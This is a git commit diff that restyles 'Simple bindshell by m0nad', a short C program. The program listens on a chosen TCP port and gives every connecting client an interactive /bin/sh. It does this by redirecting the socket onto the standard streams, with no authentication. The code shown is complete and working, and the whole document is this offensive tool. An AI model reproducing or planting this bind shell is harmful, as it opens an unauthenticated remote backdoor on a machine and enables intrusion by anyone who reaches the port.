2af2828de4a37114f9ce07b7143539dd403732a9
Victor Ramos Mello <victornrm@gmail.com>
2013-04-08 05:03:56 -0300

    style changes...

--- m0nad_bindshell.c
+++ m0nad_bindshell.c
@@ -1,6 +1,5 @@
 /*
 Simple bindshell by m0nad
-m0nad [at] email.com 
 */
 #include <stdio.h>
 #include <stdlib.h>
@@ -9,51 +8,51 @@ m0nad [at] email.com
 #include <netdb.h>
 #include <sys/socket.h>
 #include <sys/types.h>
-void erro (char *msg)
+void error(char * msg)
 {
     perror(msg);
     exit(1);
 }
+
 int
-inicia_server (struct sockaddr_in *nome, unsigned short int porta)
+init_serv(struct sockaddr_in * name, unsigned short int port)
 {
   int fd;
-  //memset((char *) nome,0, sizeof(*nome));
-  nome->sin_family = AF_INET;
-  nome->sin_port = htons(porta);
-  nome->sin_addr.s_addr = htonl(INADDR_ANY);
+  //memset ((char *) name,0, sizeof (*name));
+  name->sin_family = AF_INET;
+  name->sin_port = htons(port);
+  name->sin_addr.s_addr = htonl(INADDR_ANY);
 
-  fd = socket (AF_INET, SOCK_STREAM, IPPROTO_TCP);
-
-  if (fd < 0)
-    erro ("SOCKET");
-  if (bind (fd, (struct sockaddr *)nome, sizeof (*nome)) < 0)
-    erro ("BIND");
+  if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
+    error("SOCKET");
+  if (bind (fd, (struct sockaddr *)name, sizeof(struct sockaddr)) < 0)
+    error("BIND");
   if (listen (fd, SOMAXCONN) < 0)
-    erro ("LISTEN");
+    error("LISTEN");
 
   return fd;
 } 
 int
 main (int argc, char ** argv) 
 {
-  int sockfd, porta,conex;//tam; 
-  char * const sh[] = { "/bin/sh", NULL };
+  int sockfd, port, conex; 
+  char * const sh[] = { "/bin/sh", "-i", NULL };
   struct sockaddr_in server;
   if (argc < 2) {
-    printf ("%s porta\n",argv[0]);
+    printf("%s port\n",argv[0]);
     exit(1);
   }
-  porta = atoi (argv[1]); 
-  sockfd = inicia_server(&server, porta);  
+
+  port = atoi(argv[1]); 
+  sockfd = init_serv(&server, port);  
  
- // tam = sizeof client;
-  while ((conex = accept (sockfd, NULL, NULL)) > 0) { //while ((conex = accept (sockfd, (struct sockaddr *)&client, &tam)) > 0) {
-    if (!fork()) {
-      dup2(conex,0); dup2(conex,1); dup2(conex,2);
-      execve(sh[0], sh, NULL);
+  while ((conex = accept(sockfd, NULL, NULL)) > 0) {
+    if (!fork ()) {
+      dup2(conex, 0); dup2(conex, 1); dup2(conex, 2);
+      execve(*sh, sh, NULL);
     }
   }
+
   return 0;
 }
 
